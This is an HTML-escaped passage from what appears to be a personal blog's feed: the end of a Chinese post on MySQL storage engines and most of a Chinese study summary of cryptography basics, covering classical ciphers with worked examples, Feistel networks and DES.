&lt;p&gt;2、MyISAM存储引擎 MyISAM基于ISAM存储引擎，并对其进行扩展。它是在Web、数据仓储和其他应用环境下最常使用的存储引擎之一。MyISAM拥有较高的插入、查询速度，但不支持事务，不支持外键。&lt;/p&gt;

&lt;p&gt;MyISAM特点： 插入数据快，空间和内存使用比较低。如果表主要是用于插入新记录和读出记录，那么选择MyISAM能实现处理高效率。如果应用的完整性、并发性要求比较低，也可以使用&lt;/p&gt;

&lt;p&gt;3、MEMORY存储引擎 MEMORY存储引擎将表中的数据存储到内存中，为查询和引用其他表数据提供快速访问。&lt;/p&gt;

&lt;p&gt;MEMORY特点： 所有的数据都在内存中，数据的处理速度快，但是安全性不高。如果需要很快的读写速度，对数据的安全性要求较低，可以选择MEMOEY。&lt;/p&gt;

&lt;p&gt;它对表的大小有要求，不能建立太大的表。所以，这类数据库只使用在相对较小的数据库表。&lt;/p&gt;

&lt;h1 id=&quot;mysql-默认存储引擎&quot;&gt;MySQL 默认存储引擎&lt;/h1&gt;

&lt;p&gt;nnoDB 是系统的默认引擎，支持可靠的事务处理。&lt;/p&gt;

&lt;p&gt;使用下面的语句可以修改数据库临时的默认存储引擎&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;SET default_storage_engine=&amp;lt; 存储引擎名 &amp;gt;
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="sql" /><summary type="html">[toc]</summary></entry><entry><title type="html">密码学基础总结</title><link href="http://localhost:4000/_posts/2020-07-19-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/" rel="alternate" type="text/html" title="密码学基础总结" /><published>2020-07-19T00:00:00-04:00</published><updated>2020-07-19T00:00:00-04:00</updated><id>http://localhost:4000/_posts/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-19-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;基础概念&quot;&gt;基础概念&lt;/h1&gt;

&lt;h2 id=&quot;信息安全三要素cia&quot;&gt;信息安全三要素（CIA）&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;机密性&lt;/li&gt;
  &lt;li&gt;完整性&lt;/li&gt;
  &lt;li&gt;可用性&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;扩展：&lt;/p&gt;

&lt;p&gt;六要素：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;机密性&lt;/li&gt;
  &lt;li&gt;所有权&lt;/li&gt;
  &lt;li&gt;完整性&lt;/li&gt;
  &lt;li&gt;可认证性&lt;/li&gt;
  &lt;li&gt;可用性&lt;/li&gt;
  &lt;li&gt;实用性&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;八要素：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;机密性&lt;/li&gt;
  &lt;li&gt;完整性&lt;/li&gt;
  &lt;li&gt;可用性&lt;/li&gt;
  &lt;li&gt;隐私性&lt;/li&gt;
  &lt;li&gt;可认证性于可信任性&lt;/li&gt;
  &lt;li&gt;不可抵赖性&lt;/li&gt;
  &lt;li&gt;可说明性&lt;/li&gt;
  &lt;li&gt;可审计性&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;安全性攻击形式&quot;&gt;安全性攻击形式&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;被动攻击
    &lt;ul&gt;
      &lt;li&gt;截取&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;主动攻击
    &lt;ul&gt;
      &lt;li&gt;中断&lt;/li&gt;
      &lt;li&gt;篡改&lt;/li&gt;
      &lt;li&gt;伪造&lt;/li&gt;
      &lt;li&gt;重放&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;密码编码学&quot;&gt;密码编码学&lt;/h1&gt;

&lt;h2 id=&quot;保密体制&quot;&gt;保密体制&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;对称加密体制&lt;/li&gt;
  &lt;li&gt;非对称加密体制&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;认证体制&quot;&gt;认证体制&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;消息认证
    &lt;ul&gt;
      &lt;li&gt;消息认证码体制&lt;/li&gt;
      &lt;li&gt;数字签名&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;实体认证
    &lt;ul&gt;
      &lt;li&gt;生份鉴别协议&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;对称与非对称加密体制&quot;&gt;对称与非对称加密体制&lt;/h1&gt;

&lt;h2 id=&quot;对称加密体制&quot;&gt;对称加密体制&lt;/h2&gt;

&lt;p&gt;实用的秘钥必须完全保密，且要求加密秘钥和解密秘钥相同或由其中一个可以很容易推出另外一个&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;优点&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;速度快，有很高的吞吐率，软硬件易于实现&lt;/li&gt;
  &lt;li&gt;秘钥相对较短&lt;/li&gt;
  &lt;li&gt;对称保密体制密文长度往往与明文相同，或扩张较小&lt;/li&gt;
&lt;/ol&gt;

&lt;ul&gt;
  &lt;li&gt;缺点&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;秘钥分发需要安全通道&lt;/li&gt;
  &lt;li&gt;秘钥量大，难管理&lt;/li&gt;
  &lt;li&gt;难以解决不可否认性&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;非对称加密体制&quot;&gt;非对称加密体制&lt;/h2&gt;

&lt;p&gt;秘钥有两个，一个对外公开，另外一个必须保密，不能从公钥推到私钥，或者是计算困难&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;优点&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;秘钥分发容易&lt;/li&gt;
  &lt;li&gt;秘钥管理简单&lt;/li&gt;
  &lt;li&gt;可以有效实现数字签名&lt;/li&gt;
&lt;/ol&gt;

&lt;ul&gt;
  &lt;li&gt;缺点&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;速度慢&lt;/li&gt;
  &lt;li&gt;同等安全下，非对称密码体制对秘钥位数要多一些&lt;/li&gt;
  &lt;li&gt;非对称保密体制中，密文长度往往大于明文长度&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;柯克霍夫原则&quot;&gt;柯克霍夫原则&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;kerckhoffs princip&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;秘钥必须完全寓于秘钥中，即加密和解密算法的安全性取决于秘钥的安全性，而加密解密的过程和细节是公开的，只要秘钥是安全的，则攻击者无法推出明文&lt;/p&gt;

&lt;p&gt;实际应用中，攻击者的能力还会受到进一步限制：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;破解密码系统的成本不超过被加密信息本身&lt;/li&gt;
  &lt;li&gt;破译密码系统时间不超过被加密信息的有效生命周期&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;密码学加密系统的五元组&quot;&gt;密码学加密系统的五元组&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;明文，密文，密钥，加密算法，解密算法
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;密码体制攻击类型&quot;&gt;密码体制攻击类型&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;唯密文攻击（Ciphertext only）
 破译者已知：加密算法、待破译的密文&lt;/li&gt;
  &lt;li&gt;已知明文攻击（Known plaintext）
 破译者已知：加密算法、一定数量的明文和对应的密文&lt;/li&gt;
  &lt;li&gt;选择明文攻击（Chosen plaintext） 
破译者已知：加密算法、选定的明文和对应的密文&lt;/li&gt;
  &lt;li&gt;选择密文攻击（Chosen ciphertext） 
破译者已知：加密算法、选定的密文和对应的明文&lt;/li&gt;
  &lt;li&gt;选择文本攻击（Chosen text）
破译者已知：加密算法、选定的明文和对应的密文、选定的密文和对应的明文&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;对加密系统的攻击类型前四种&quot;&gt;对加密系统的攻击类型（前四种）&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;1.已知明文攻击 （知道一些名密文对）
2选择明文攻击 （任意明文-&amp;gt;密文）
3.唯密文攻击 （只知道一些密文）    
4选择密文攻击（任意密文-&amp;gt;明文）
5.选择文本攻击（任意明文&amp;lt;-&amp;gt;任意密文）
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;攻击常用方法&quot;&gt;攻击常用方法&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;穷举&lt;/li&gt;
  &lt;li&gt;统计分析&lt;/li&gt;
  &lt;li&gt;数学分析&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;熵&quot;&gt;熵&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;随机事件x发生的概率的对数的相反数定义为该随机事件的自信息量，记为I（xi），设xi发生的概率为p（xi），则自信息量为：&lt;/em&gt;
&lt;script type=&quot;math/tex&quot;&gt;I(x)_{i} = - log_{2}p(x_{i})&lt;/script&gt;
底数为2，信息量单位为比特，如果以e为底数，单位为奈特&lt;/p&gt;

&lt;h1 id=&quot;古典密码&quot;&gt;古典密码&lt;/h1&gt;

&lt;h2 id=&quot;置换&quot;&gt;置换&lt;/h2&gt;

&lt;p&gt;置换：根据一定的规则重新排列明文，打破明文结构特性&lt;/p&gt;

&lt;h3 id=&quot;列置换&quot;&gt;列置换&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;明文按照秘钥规则按列换位并且得到密文&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/img/置换密码.png&quot; alt=&quot;置换密码&quot; /&gt;&lt;/p&gt;

&lt;h3&gt;&lt;img src=&quot;/img/置换密码举例.png&quot; alt=&quot;置换密码举例&quot; /&gt;&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/img/列置换.png&quot; alt=&quot;列置换&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/列置换2.png&quot; alt=&quot;列置换2&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;周期置换&quot;&gt;周期置换&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;将明文按照固定长度分组，然后对每组按照某种排列位置得到密文&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;例子&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;明文：“State Key Laboratory of Networking and Switching”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;加密的密钥：S=(1 5 6 2 3)；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将明文分为七组，每组6个字符，不足6个的用双方规定好的字符进行填充，比如空格。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;​      P’ = (StateK)(eyLabo)(ratory)(ofNetw)(orking)(andSwi)(tching)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;对每组的字符进行加密，根据密钥S，可知将第1个字符放在第5个字符的位置，第5个字符放在第6个字符的位置，第6个字符放在第2个字符的位置，第2个字符放在第3个字符的位置，第3个字符放在第1个字符的位置，置换后P’如下：&lt;/p&gt;

    &lt;p&gt;P‘ = (aKttSe)(Loyaeb)(tyaorr)(Nwfeot)(kgrion)(dinSaw)(hgcitn)&lt;/p&gt;

    &lt;p&gt;所以得到的最终密文Pm = “aKttSeLoyaebtyaorrNwfeotkgriondinSawhgcitn”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;周期置换的解密方法就是加密的逆运算，只需求出密钥的逆置换即可。可以知道密钥S=(1 5 6 2 3)的逆置换S’ = (1 3 2 6 5)，所以只需将密文重新分组，通过S’的置换顺序就可以得出明文P&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;代换密码&quot;&gt;代换密码&lt;/h2&gt;

&lt;p&gt;代换，就是将明文中的一个字母由其它字母、数字或者符号替代的一种方法
代换密码建立一个代换表，加密时将需要加密的明文依次通过查表，替换为相应的字符，明文字符被逐个替换后，生成无任何意义的字符串，即密文。这样的代换表被称为密钥&lt;/p&gt;

&lt;h3 id=&quot;单表代换密码&quot;&gt;单表代换密码&lt;/h3&gt;

&lt;p&gt;单表代换是指英文字母在进行密码编码替换的时候，有一张对照表，也就是说，对于每一个字母，都是唯一对应的，如：&lt;/p&gt;

&lt;p&gt;26个源字母表为：abcdefghijklmnopqrstuvwxyz&lt;/p&gt;

&lt;p&gt;代换的字母表为：qwertyuiopasdfghjklzxcvbnm&lt;/p&gt;

&lt;p&gt;在加密时，按照设计好的对照表对每一个明文字母进行替换，如a替换为q，b替换为w等。&lt;/p&gt;

&lt;h3 id=&quot;放射密码&quot;&gt;放射密码&lt;/h3&gt;

&lt;p&gt;加法密码和乘法密码结合就构成仿射密码，仿射密码的加密和解密算法是：
&lt;script type=&quot;math/tex&quot;&gt;C=EK(m)=(k_{1}m+k_{2})modn\\
M = DK(C)=k_{3}(C-k_{2})mod n\\
(k_{3}Xk_{1})mod 26=1\\&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;仿射密码具有可逆性的条件是:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;gcd(k1, n)=1&lt;/code&gt;. 当k1=1时，仿射密码变为加法密码，当k2=0时，仿射密码变为乘法密码。
仿射密码中的密钥空间的大小为&lt;code&gt;nφ(n)&lt;/code&gt;，当&lt;code&gt;n&lt;/code&gt;为&lt;code&gt;26&lt;/code&gt;字母，&lt;code&gt;φ(n)=12&lt;/code&gt;，因此仿射密码的密钥空间为12×26 = 312&lt;/p&gt;

&lt;h4 id=&quot;例子&quot;&gt;例子&lt;/h4&gt;

&lt;p&gt;设放射密码加密函数为：&lt;code&gt;e(x)=11x+6(mod 26)&lt;/code&gt;,则有11^{-1}(mod26)=19,所以解密函数:&lt;code&gt;x=19[e(x)-6]=19e(x)+16(mod 26)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;设加密明文：&lt;code&gt;sorcery&lt;/code&gt;，转换为数字：&lt;code&gt;18,14,17,2,4,17,24&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;加密：
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
11*
 \left[
 \begin{matrix}
   18 \\
   14 \\
   17\\
   2\\
   4\\
   17\\
   24\\
  \end{matrix}
  \right]
+
 \left[
 \begin{matrix}
   6 \\
   6 \\
   6\\
   6\\
   6\\
   6\\
   6\\
  \end{matrix}
  \right]
  =
   \left[
 \begin{matrix}
   204 \\
   160\\
   193\\
  28\\
   50\\
   193\\
  270\\
  \end{matrix}
  \right]
  =
   \left[
 \begin{matrix}
   22 \\
   4\\
   11\\
  2\\
   24\\
   11\\
  10\\
  \end{matrix}
  \right]
 (mod26)
&lt; =&gt;
 \left[
 \begin{matrix}
   W \\
   E\\
   L\\
   C\\
   y\\
   L\\
   K\\
  \end{matrix}
  \right] %]]&gt;&lt;/script&gt;
解密：
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
19*
 \left[
 \begin{matrix}
   22 \\
   4 \\
   11\\
   2\\
   24\\
   11\\
   10\\
  \end{matrix}
  \right]
+
 \left[
 \begin{matrix}
   16 \\
   16 \\
   16\\
   16\\
   16\\
   16\\
   16\\
  \end{matrix}
  \right]
  =
   \left[
 \begin{matrix}
   434 \\
   92\\
   225\\
  54\\
   472\\
   225\\
  206\\
  \end{matrix}
  \right]
  =
   \left[
 \begin{matrix}
   18\\
   14\\
   17\\
  2\\
   4\\
   17\\
  24\\
  \end{matrix}
  \right]
 (mod26)
&lt; =&gt;
 \left[
 \begin{matrix}
   s \\
   o\\
   r\\
   c\\
   e\\
   r\\
   y\\
  \end{matrix}
  \right] %]]&gt;&lt;/script&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;求逆元：&lt;strong&gt;扩展欧几里得算法&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;多表代换&quot;&gt;多表代换&lt;/h3&gt;

&lt;h4 id=&quot;维吉尼亚密码&quot;&gt;维吉尼亚密码&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/img/多表代换.png&quot; alt=&quot;多表代换&quot; /&gt;&lt;/p&gt;

&lt;p&gt;例题：&lt;/p&gt;

&lt;p&gt;p=data security , k = best&lt;/p&gt;

&lt;p&gt;先将明文分解为长为4的序列：&lt;/p&gt;

&lt;p&gt;data 			secu 			rity&lt;/p&gt;

&lt;p&gt;每个序列用秘钥best加密&lt;/p&gt;

&lt;p&gt;密文：EELT  	TIUN	  SMLR&lt;/p&gt;

&lt;h4 id=&quot;playfair密码&quot;&gt;Playfair密码&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/img/维吉尼亚密码.png&quot; alt=&quot;维吉尼亚密码&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/playfair2.png&quot; alt=&quot;playfair2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;例题：&lt;/p&gt;

&lt;p&gt;设秘钥为：PLAYFAIR IS A DIGRAM CIPHER&lt;/p&gt;

&lt;p&gt;字母矩阵：
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
\left[
 \begin{matrix}
  P&amp;L &amp;A &amp;Y&amp; F \\
   I/J&amp;R&amp;S&amp;D&amp;G\\
   M&amp;C&amp;H&amp;E&amp;B\\
   K&amp;N&amp;O&amp;Q&amp;T\\
   U&amp;V&amp;W&amp;X&amp;Z\\
  \end{matrix}
  \right] %]]&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;明文：pI ay fa ir ci ph er&lt;/p&gt;

&lt;p&gt;密文: LA YF PY RS MR AM CD&lt;/p&gt;

&lt;h4 id=&quot;希尔密码&quot;&gt;希尔密码&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/img/希尔密码.png&quot; alt=&quot;希尔密码&quot; /&gt;&lt;/p&gt;

&lt;p&gt;例题：&lt;/p&gt;

&lt;p&gt;明文：cyber，数字化：2,24,1,4,17&lt;/p&gt;

&lt;p&gt;秘钥:
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
\left[
\begin{matrix}
  10&amp;5 &amp;12 &amp;0&amp; 0 \\
   3&amp;14&amp;21&amp;0&amp;0\\
   8&amp;9&amp;11&amp;0&amp;0\\
   0&amp;0&amp;0&amp;11&amp;8\\
   0&amp;0&amp;0&amp;3&amp;7\\
  \end{matrix}
  \right] %]]&gt;&lt;/script&gt;
加密：
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
c=(2,24,1,4,17)
\left[
\begin{matrix}
  10&amp;5 &amp;12 &amp;0&amp; 0 \\
   3&amp;14&amp;21&amp;0&amp;0\\
   8&amp;9&amp;11&amp;0&amp;0\\
   0&amp;0&amp;0&amp;11&amp;8\\
   0&amp;0&amp;0&amp;3&amp;7\\
  \end{matrix}
  \right]
  =
  \left[
\begin{matrix}
  100 \\
   355\\
   539\\
   95\\
   151\\
  \end{matrix}
  \right]^{T}
  (mod26)=
  \left[
\begin{matrix}
  22 \\
   17\\
   19\\
   17\\
   21\\
  \end{matrix}
  \right]^{T}
  &lt;=&gt;
  \left[
  \begin{matrix}
  W\\
  R\\
  T\\
  R\\
  V
  \end{matrix}
  \right] %]]&gt;&lt;/script&gt;
解密秘钥：
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
K^{-1}=
\left[
\begin{matrix}
21&amp;15&amp;17&amp;0&amp;0\\
21&amp;2&amp;16&amp;0&amp;0\\
25&amp;4&amp;3&amp;0&amp;0\\
0&amp;0&amp;0&amp;7&amp;18\\
0&amp;0&amp;0&amp;23&amp;11
\end{matrix}
\right] %]]&gt;&lt;/script&gt;
解密：
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
p=(22,17,19,17,21)
\left [
\begin{matrix}
21&amp;15&amp;17&amp;0&amp;0\\
21&amp;2&amp;16&amp;0&amp;0\\
25&amp;4&amp;3&amp;0&amp;0\\
0&amp;0&amp;0&amp;7&amp;18\\
0&amp;0&amp;0&amp;23&amp;11
\end{matrix}
\right ]
=
\left [
\begin{matrix}
1328\\
440\\
703\\
602\\
537
\end{matrix}
\right ]^{T}
(mod 26)
=
\left[
\begin{matrix}
2\\
24\\
1\\
4\\
17
\end{matrix}
\right ]
&lt;=&gt;
\left[
\begin{matrix}
c\\y\\
b\\
e\\
r
\end{matrix}
\right]^{T} %]]&gt;&lt;/script&gt;&lt;/p&gt;

&lt;h1 id=&quot;分组密码&quot;&gt;分组密码&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;分组密码（block cipher）是现代密码学中的重要体制之一，也是应用最广泛、影响最大的一种密码体制。其主要任务是提供数据保密性，也可以用在伪随机数生成器、序列密码、认证码和哈希函数的构造&lt;/p&gt;

  &lt;p&gt;分组密码又称为对称密码，具有加解密速度快、安全性好的特点。得到许多密码芯片的支持，在许多研究和应用领域中得到了广泛的应用&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/img/分组密码流程.png&quot; alt=&quot;分组密码流程&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;扩散混乱&quot;&gt;扩散＆混乱&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;扩散：打乱明文，每一位比特明文的变化尽可能影响输出的密文序列比特，使得明文和密文之间的统计关系尽量复杂，即从密文不能获得明文的统计特性&lt;/li&gt;
  &lt;li&gt;混乱：打乱明文，加密过程中，明文，密文，秘钥间的关系尽可能复制，使从密文中不能获得密钥的任何统计特性&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;feiste网络&quot;&gt;Feiste网络&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;用简单算法的乘积来近似表达复杂的替代变换&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;优点：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;加解密相似，只需要一个逆转的密钥编排算法，加解密算法部分完全一致&lt;/li&gt;
  &lt;li&gt;轮函数不必可逆&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;原理&quot;&gt;原理&lt;/h3&gt;

&lt;p&gt;F表示轮函数,Ki表示每一轮的子秘钥&lt;/p&gt;

&lt;h4 id=&quot;加密&quot;&gt;加密&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;i表示轮数&lt;/p&gt;
&lt;/blockquote&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;将明文分割为左右两部分(L_{0},R_{0})\\
L_{i+1} = R_{i}\\
R_{i+1} = L_{i}\bigoplus F(R_{i},k_{i})\\&lt;/script&gt;

&lt;h4 id=&quot;解密&quot;&gt;解密&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;(i=n,n-1,…0)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;R_{i}  = L_{i+1}\\
l_{i} = R_{i+1}\bigoplus(L_{i+1},k_{i})\\
(L_{0},R_{0})为解密后的明文&lt;/script&gt;

&lt;h2 id=&quot;雪崩效应&quot;&gt;雪崩效应&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/雪崩效应.png&quot; alt=&quot;雪崩效应&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;sp网络&quot;&gt;SP网络&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/sp网络.png&quot; alt=&quot;sp网络&quot; /&gt;&lt;/p&gt;

&lt;p&gt;SP网络具有雪崩效应&lt;/p&gt;

&lt;h2 id=&quot;子秘钥生成方法&quot;&gt;子秘钥生成方法&lt;/h2&gt;

&lt;p&gt;子秘钥生成是迭代分组算法的一个重要部分，轮函数Ｆ的功能是在子秘钥的参与和控制下实现的&lt;/p&gt;

&lt;p&gt;子秘钥评价指标：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;简单，速度快&lt;/li&gt;
  &lt;li&gt;种子秘钥的所有比特对每个子秘钥比特的影响大致相同&lt;/li&gt;
  &lt;li&gt;没有弱秘钥&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;轮函数ｆ设计准则&quot;&gt;轮函数Ｆ设计准则&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;非线性&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;依赖Ｓ盒&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;可逆性&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;雪崩效应&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;des加密&quot;&gt;DES加密&lt;/h1&gt;

&lt;h2 id=&quot;概述&quot;&gt;概述&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;分组加密：明文密文为64位分组长度&lt;/li&gt;
  &lt;li&gt;密码算法：同一个算法&lt;/li&gt;
  &lt;li&gt;密钥长度：56位，存在弱秘钥，但是可以避开&lt;/li&gt;
  &lt;li&gt;采用混乱和扩散组合,每个组先代换后置换，共16轮&lt;/li&gt;
  &lt;li&gt;易于实现,速度快&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;流程&quot;&gt;流程&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/des加密.png&quot; alt=&quot;des加密&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;初始置换ip&quot;&gt;初始置换(IP)&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/初始置换.png&quot; alt=&quot;初始置换&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;轮变换&quot;&gt;轮变换&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/轮变换.png&quot; alt=&quot;轮变换&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;f函数&quot;&gt;F函数&lt;/h2&gt;

&lt;h3 id=&quot;扩展置换&quot;&gt;扩展置换&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;又叫E盒&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;扩展置置换目标是IP置换后获得的右半部分R0，将32位输入扩展为48位(分为4位×8组)输出。&lt;/p&gt;

&lt;p&gt;扩展置换目的有两个：生成与密钥相同长度的数据以进行异或运算；提供更长的结果，在后续的替代运算中可以进行压缩。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/E盒.png&quot; alt=&quot;E盒&quot; /&gt;&lt;/p&gt;

&lt;p&gt;表中的数字代表位，两列黄色数据是扩展的数据，可以看出，扩展的数据是从相邻两组分别取靠近的一位，4位变为6位。靠近32位的位为1，靠近1位的位为32。表中第二行的4取自上组中的末位，9取自下组中的首位。&lt;/p&gt;

&lt;h3 id=&quot;秘钥加&quot;&gt;秘钥加&lt;/h3&gt;

&lt;p&gt;E扩展输出的49位与48位子秘钥逐位异或,输出48位数据&lt;/p&gt;

&lt;h3 id=&quot;代换盒&quot;&gt;代换盒&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;S盒&lt;/p&gt;

  &lt;p&gt;目的:非线性变换&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;压缩后的密钥与扩展分组异或以后得到48位的数据，将这个数据送人S盒，进行替代运算。替代由8个不同的S盒完成，每个S盒有6位输入4位输出。48位输入分为8个6位的分组，一个分组对应一个S盒，对应的S盒对各组进行代替操作。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/S盒.png&quot; alt=&quot;S盒&quot; /&gt;&lt;/p&gt;

&lt;p&gt;　一个S盒就是一个4行16列的表，盒中的每一项都是一个4位的数。S盒的6个输入确定了其对应的输出在哪一行哪一列，输入的高低两位做为行数H，中间四位做为列数L，在S-BOX中查找第H行L列对应的数据(&amp;lt;32)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;S盒代替时DES算法的关键步骤，所有的其他的运算都是线性的，易于分析，而S盒是非线性的，相比于其他步骤，提供了更好安全性。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;p盒置换&quot;&gt;P盒置换&lt;/h3&gt;

&lt;p&gt;S盒代替运算的32位输出按照P盒进行置换。该置换把输入的每位映射到输出位，任何一位不能被映射两次，也不能被略去,映射规则如下表:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;16&lt;/th&gt;
      &lt;th&gt;7&lt;/th&gt;
      &lt;th&gt;20&lt;/th&gt;
      &lt;th&gt;21&lt;/th&gt;
      &lt;th&gt;29&lt;/th&gt;
      &lt;th&gt;12&lt;/th&gt;
      &lt;th&gt;28&lt;/th&gt;
      &lt;th&gt;17&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
